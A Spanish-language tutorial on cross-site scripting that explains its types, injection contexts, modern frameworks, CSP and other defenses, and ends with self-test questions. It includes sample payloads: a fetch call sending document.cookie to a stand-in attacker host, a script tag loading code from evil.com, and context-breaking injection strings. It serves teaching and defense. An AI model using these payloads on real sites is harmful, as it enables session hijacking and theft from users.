---
title: "XSS (Cross-Site Scripting): El Parásito del Navegador"
---

# XSS (Cross-Site Scripting): El Parásito del Navegador

## Objetivo de esta Guía

Entender por que el navegador del usuario (Chrome, Firefox, Safari) es el eslabón más débil de la cadena, y como un atacante puede ejecutar codigo JavaScript malicioso en tu computadora sin enviarte ningún archivo virus o exploit de día cero.

A diferencia de la Inyección SQL, donde el atacante destruye el servidor trasero (El Cocinero), en XSS (Cross-Site Scripting) al hacker no le importa el servidor directamente. El hacker usa la pagina web legítima como un simple vehículo para atacar a otros usuarios.

XSS es tan común y tan peligroso que OWASP lo clasifica dentro de A03: Injection, la misma categoría que SQL Injection, porque el mecanismo es el mismo: inyectar codigo malicioso que es interpretado por un runtime. La diferencia es que en XSS, el interprete es el navegador de la victima, no el servidor de base de datos.

## La Analogía: El Dardo Envenenado en la Carta

Imagina que el Servidor (Backend) es un cartero. Su único trabajo es tomar cartas (comentarios, mensajes, perfiles) de un usuario y entregárselas a otro usuario. El cartero es un robot eficiente: no lee las cartas, solo las entrega.

1. El Atacante escribe una carta (un comentario en un blog). Pero adentro de la carta, pega con cinta adhesiva un **Dardo Envenenado** con un resorte. Se la da al cartero.
2. El cartero toma la carta y la guarda en la base de datos de comentarios.
3. Al día siguiente, la **Victima** entra a leer el blog.
4. El cartero (Servidor) le entrega la carta a la Victima.
5. La Victima (El navegador Chrome) abre la carta. El resorte salta, el dardo envenenado se le clava en la cara a la victima.

**De quien es la culpa?** Del cartero (El Servidor / Programador), por no haber revisado la carta (Filtrar / Sanitizar) y quitarle las armas antes de entregársela al siguiente usuario.

## El Codigo: Como Funciona el Ataque

El "Dardo Envenenado" en la vida real es un pedazo de codigo escrito en **JavaScript**. Los navegadores están programados para obedecer ciegamente cualquier cosa que este encerrada entre las etiquetas `<script>` y `</script>`.

Si el foro de tu escuela te pregunta: "Cual es tu nombre?", un usuario normal escribe `Juan`. Un Hacker escribe:

```html
<script>alert("Has sido hackeado");</script>
```

Si el programador fue perezoso y guardó ese texto crudo en la base de datos, cada vez que alguien visite el perfil del hacker, el navegador de la victima no verá la palabra "script", simplemente ejecutará la orden y le sacará una ventana molesta.

### Más allá de la molestia: Robo de Sesión

Sacar ventanas emergentes (`alert`) es divertido para un novato, pero un hacker real hace esto de forma silenciosa:

```html
<script>
  fetch('https://atacante.com/robo?cookie=' + document.cookie);
</script>
```

Ese pequeño comando toma tu **Cookie de Sesión** (El post-it que le dice al servidor quien eres) y se la envía al servidor remoto del atacante. El atacante ahora es dueño de tu cuenta, y tu nunca te diste cuenta porque la pagina pareció cargar normalmente.

El codigo también puede:
- Robar tokens de autenticación almacenados en localStorage o sessionStorage
- Capturar lo que escribes (keylogging)
- Tomar fotos con tu cámara si la pagina tiene permisos (navegadores modernos piden permiso)
- Redirigirte a un sitio de phishing
- Modificar el contenido de la pagina para engañarte (defacement)
- Realizar acciones en tu nombre (cambiar contrasena, transferir dinero) usando tu sesión activa

## Tipos de XSS

### XSS Almacenado (Stored XSS) - La Bomba de Tiempo

El peor de todos. El atacante guarda el codigo malicioso en la base de datos del servidor. Cada vez que alguien visita la pagina que muestra ese contenido, se infecta.

**Ejemplos reales:**
- Un comentario en un blog que contiene `<script>` malicioso. Cada visitante de esa entrada ejecuta el script.
- Un perfil de usuario con un campo "biografia" que no sanitiza entradas. Cada visita al perfil ejecuta el ataque.
- Un foro de discusión donde los mensajes no se filtran.

**Por que es el más peligroso:** No requiere que la victima haga clic en ningún enlace. La victima solo necesita visitar la pagina legítima del servicio que usa. No hay forma de que la victima sepa que esta siendo atacada hasta que es demasiado tarde.

**Caso real:** En 2005, Samy Kamkar creo el gusano Samy para MySpace. Exploto un XSS almacenado que agregaba a Samy como amigo y copiaba el codigo al perfil de la victima. En 24 horas, tenía más de 1 millón de amigos. MySpace tuvo que cerrar el sitio para eliminar el codigo.

### XSS Reflejado (Reflected XSS) - El Espejo

El codigo malicioso va escondido en un Link que el hacker te envía por WhatsApp o correo. Cuando das clic, la pagina del sitio legítimo abre, recibe el parámetro malicioso, y lo "refleja" de vuelta a tu pantalla sin validarlo.

**Ejemplo:**
Un sitio de búsqueda que muestra el término buscado en la pagina de resultados:

```
https://ejemplo.com/buscar?q=<script>alert('XSS')</script>
```

Si el sitio no sanitiza el parámetro `q`, el script se ejecuta en el navegador de quien visita ese enlace.

**Por que es menos peligroso que Stored XSS:** Requiere que la victima haga clic en un enlace específico. El atacante necesita distribuir el enlace (phishing, redes sociales, etc.) y convencer a la victima de que haga clic.

**Pero sigue siendo peligroso:** El enlace puede ser acortado (bit.ly), puede estar disfrazado detrás de un botón o imagen, y el dominio es el del sitio legítimo, lo que reduce las sospechas de la victima.

### XSS Basado en DOM (DOM-based XSS)

El ataque ocurre enteramente dentro del codigo JavaScript del Frontend, sin que el servidor participe. El codigo malicioso nunca viaja al servidor.

**Ejemplo:**
Una pagina que lee un valor de la URL (como el fragmento después de `#`) y lo escribe directamente en el DOM:

```javascript
var usuario = location.hash.substring(1);
document.getElementById('bienvenida').innerHTML = 'Bienvenido, ' + usuario;
```

Si el atacante envía un enlace como `https://ejemplo.com/#<script>alert('XSS')</script>`, el JavaScript del cliente ejecuta el script sin que el servidor intervenga.

**Por que es difícil de detectar:** Las herramientas de seguridad tradicionales (WAFs, escaners) solo ven el tráfico que llega al servidor. Como el ataque DOM-based ocurre completamente en el cliente, no hay evidencia en los logs del servidor.

### XSS Universal (UXSS)

Es el más raro pero el más devastador. Ocurre cuando hay una vulnerabilidad en el navegador mismo o en una extensión. Permite ejecutar JavaScript en cualquier dominio, sin importar la política de Same-Origin. Si un atacante encuentra un UXSS en Chrome, puede robar datos de cualquier pagina que la victima tenga abierta.

## El Contexto de Ejecución

El XSS no siempre ocurre dentro de etiquetas `<script>`. Dependiendo de donde se inyecte el codigo, el atacante adapta la sintaxis.

**Dentro de HTML:**
```html
<div>${input_del_usuario}</div>
```
Ataque: `<img src=x onerror=alert(1)>`

**Dentro de un atributo HTML:**
```html
<input value="${input_del_usuario}">
```
Ataque: `" onfocus="alert(1)" autofocus="`

**Dentro de JavaScript:**
```javascript
var mensaje = '${input_del_usuario}';
```
Ataque: `'; alert(1); var foo = '`

**Dentro de CSS:**
```css
background-image: url('${input_del_usuario}');
```
Ataque: `javascript:alert(1)`

Cada contexto requiere una técnica de sanitización diferente. Por eso la sanitización genérica es difícil.

## XSS en 2025: El Panorama Actual

En 2025, encontrar un XSS clásico en una aplicación web moderna es cada vez más raro. Los frameworks de Frontend modernos (React, Angular, Vue, Svelte) escapan las entradas por defecto. Si escribes `{variable}` en un template de React, React automáticamente convierte `<script>` en `&lt;script&gt;`.

Sin embargo, XSS sigue vivo por estas razones:

**dangerouslySetInnerHTML (React):** La funcion que React creo específicamente para saltarse la protección. Si un desarrollador la usa con datos del usuario, el XSS clásico vuelve a funcionar.

**v-html (Vue):** Similar a dangerouslySetInnerHTML. Permite inyectar HTML crudo.

**innerHTML (JavaScript vanilla):** Cualquier codigo que use `innerHTML` con datos del usuario es vulnerable.

**Aplicaciones server-side rendering (SSR):** Las aplicaciones que renderizan HTML en el servidor (Next.js, Nuxt, PHP tradicional, Ruby on Rails) pueden ser vulnerables si no escapan las variables en las plantillas del servidor.

**Markdown renderers:** Muchos sitios permiten a los usuarios escribir en Markdown y lo convierten a HTML. Si el renderizador de Markdown no es seguro, el atacante puede inyectar HTML directamente o usar sintaxis de Markdown que genera HTML peligroso.

**Aplicaciones móviles con WebViews:** Las apps que cargan contenido web dentro de un WebView pueden ser vulnerables si no sanitizan el contenido antes de cargarlo.

## XSS en APIs y Aplicaciones Headless

Las APIs que devuelven HTML (como las que generan contenido para ser renderizado en el cliente) son vectores de XSS. Si una API devuelve `<script>alert(1)</script>` en una respuesta JSON, y el Frontend inserta ese HTML en el DOM sin sanitizar, el XSS ocurre.

Los sistemas de cabeza (headless CMS) que permiten a los editores escribir contenido rico (Rich Text) son vectores comunes. El editor escribe contenido formateado que se guarda como HTML. Si el sistema no sanitiza el HTML de salida, un atacante que logre acceso al CMS puede inyectar XSS persistente que afecta a todos los visitantes.

## Mitigaciones de Navegador (Defensas del Lado del Cliente)

Los navegadores modernos han implementado defensas que dificultan el XSS:

**Content Security Policy (CSP):** Es la defensa más importante contra XSS. Es un header HTTP que le dice al navegador que fuentes de contenido están autorizadas.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com
```

Con esta política, el navegador bloquea cualquier script que no venga del mismo origen o de `cdn.trusted.com`. Incluso si un atacante inyecta `<script>alert(1)</script>`, el navegador no lo ejecuta.

**Niveles de CSP:**
- `script-src 'self'`: Solo scripts del mismo origen.
- `script-src 'nonce-abc123'`: Solo scripts con el atributo `nonce="abc123"`.
- `script-src 'strict-dynamic'`: Permite scripts cargados por otros scripts confiables.

**XSS Auditor (Chrome antiguo):** Chrome tenía un filtro de XSS que detectaba reflejados. Fue eliminado porque tenía falsos positivos y podía ser evadido. Reemplazado por CSP.

**Trusted Types (Chrome):** Una API que obliga a los desarrolladores a pasar por funciones de sanitización antes de insertar HTML en el DOM. Previene el XSS DOM-based.

## La Defensa: Como Prevenir XSS

Prevenir el XSS requiere una estrategia de múltiples capas:

### Sanitización de Salida (Output Encoding)

Cuando muestras datos del usuario en una pagina, debes convertirlos al formato seguro correspondiente según el contexto:

- Para HTML: convertir `<` en `&lt;`, `>` en `&gt;`, `"` en `&quot;`, `&` en `&amp;`
- Para JavaScript: escapar comillas, barras invertidas y caracteres de control
- Para atributos HTML: escapar comillas y espacios
- Para URLs: usar `encodeURI()` o `encodeURIComponent()`

**Librerías de sanitización:**
- DOMPurify (JavaScript): Sanitiza HTML manteniendo etiquetas seguras.
- OWASP Java Encoder: Codifica salidas para Java.
- Bleach (Python): Sanitiza HTML en Python.
- Rails HTML Sanitizer (Ruby): Para aplicaciones Rails.

### Content Security Policy (CSP)

Implementa CSP estricto en tu servidor. No uses `'unsafe-inline'` en `script-src` si puedes evitarlo. Usa nonces o hashes para scripts inline.

### Validación de Entrada (Input Validation)

Valida que los datos del usuario cumplen con el formato esperado. Si esperas un número, verifica que sea numérico. Si esperas un correo, verifica que coincida con el patrón de email.

Pero la validación de entrada NO es suficiente para prevenir XSS. Un nombre como `O'Brien` contiene una comilla que es perfectamente valida en HTML después de escaparla.

### Usar Frameworks Modernos

React, Angular, Vue y Svelte escapan las salidas por defecto. Si usas estos frameworks correctamente (sin `dangerouslySetInnerHTML`, `v-html`, o `bypassSecurityTrustHtml`), estas protegido contra la mayoría de XSS.

### HttpOnly en Cookies

La bandera `HttpOnly` en las cookies evita que el JavaScript del navegador acceda a `document.cookie`. Si un atacante logra inyectar XSS, no podrá robar las cookies de sesión (pero aún puede hacer otras cosas maliciosas).

## Modos de Falla con XSS

**Confiar solo en la sanitización del Frontend.** Si el Frontend sanitiza pero el Backend guarda el texto original, y luego otro Frontend (API, app móvil) muestra el texto sin sanitizar, el XSS ocurre en ese otro cliente.

**Permitir HTML enriquecido sin restricciones.** Los editores WYSIWYG (TinyMCE, CKEditor) permiten a los usuarios formatear texto. Pero si permites ciertas etiquetas, el atacante puede inyectar atributos peligrosos como `onerror`, `onload`, `onclick`.

**Usar `innerHTML` en lugar de `textContent`.** `textContent` trata el contenido como texto plano y escapa automáticamente. `innerHTML` lo trata como HTML y no escapa nada.

**No conocer el contexto de salida.** Escapar para HTML pero no para JavaScript, o viceversa. Un mismo dato puede aparecer en diferentes contextos (HTML, atributo, JavaScript, CSS, URL) y requiere diferentes técnicas de escape.

## Autoevaluación

1. Por que en un ataque de Inyección SQL la victima es el servidor de la empresa, mientras que en XSS la victima es el cliente (el usuario de la pagina)?

2. Encuentras un XSS Reflejado en la pagina de un Banco. Le mandas el link malicioso a una victima por correo. Que archivo temporal crítico de su navegador web estas intentando robar mediante tu codigo JavaScript?

3. Como Analista de SOC, ves que un usuario llamado "Pepe" subió una foto de perfil, pero en lugar del nombre de su foto, escribió `<script src="http://evil.com/virus.js"></script>`. Que tipo exacto de XSS esta intentando ejecutar si su objetivo es infectar a todos los que visiten su perfil mañana?

4. El desarrollador Frontend te dice: "No te preocupes por el XSS, yo escribí un codigo que bloquea la palabra específica `<script>`." Por que esto es una defensa inútil? (Pista: Piensa en otras etiquetas HTML que pueden cargar recursos o ejecutar eventos.)

5. Explica la diferencia entre la bandera `HttpOnly` en una Cookie y el header CSP `script-src`. Cual protege contra que y cual es el alcance de cada una?

6. Tu aplicación usa React y nunca usas `dangerouslySetInnerHTML`. Sin embargo, tienes un endpoint de API que devuelve HTML generado en el servidor y lo insertas en el DOM usando `innerHTML` en JavaScript vanilla. Eres vulnerable? Explica.

7. Un atacante descubre un XSS almacenado en el campo "descripción del producto" de una tienda en línea. Describe tres acciones maliciosas que podría realizar el script además de robar cookies.

8. Durante una auditoría, encuentras que el sitio tiene un CSP que incluye `'unsafe-inline'` en `script-src`. Por que esto debilita significativamente la protección contra XSS?
